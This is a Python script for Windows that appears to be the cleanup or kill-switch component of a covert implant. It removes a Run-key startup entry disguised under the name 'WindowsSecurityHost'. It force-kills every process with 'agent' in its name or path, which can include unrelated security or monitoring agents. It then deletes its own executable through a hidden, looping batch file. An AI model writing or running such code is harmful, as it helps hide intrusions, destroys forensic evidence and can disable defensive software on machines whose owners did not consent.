#!/usr/bin/env python3
import os
import sys
import time
import subprocess

REG_KEY  = r'Software\Microsoft\Windows\CurrentVersion\Run'
REG_NAME = 'WindowsSecurityHost'


def remove_startup():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REG_NAME)
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass
    except Exception:
        pass


def kill_agent():
    try:
        import psutil
        current = os.getpid()
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                if proc.info['pid'] == current:
                    continue
                name = (proc.info['name'] or '').lower()
                exe  = (proc.info['exe']  or '').lower()
                if 'agent' in name or 'agent' in exe:
                    proc.kill()
            except Exception:
                pass
    except Exception:
        pass


def self_delete():
    if not getattr(sys, 'frozen', False):
        return
    exe = sys.executable
    bat = exe + '_del.bat'
    with open(bat, 'w') as f:
        f.write(f'@echo off\n:loop\ndel /f /q "{exe}"\nif exist "{exe}" goto loop\ndel /f /q "%~f0"\n')
    subprocess.Popen(['cmd.exe', '/c', bat], creationflags=0x08000008)


def main():
    remove_startup()
    kill_agent()
    time.sleep(1)
    self_delete()


if __name__ == '__main__':
    main()
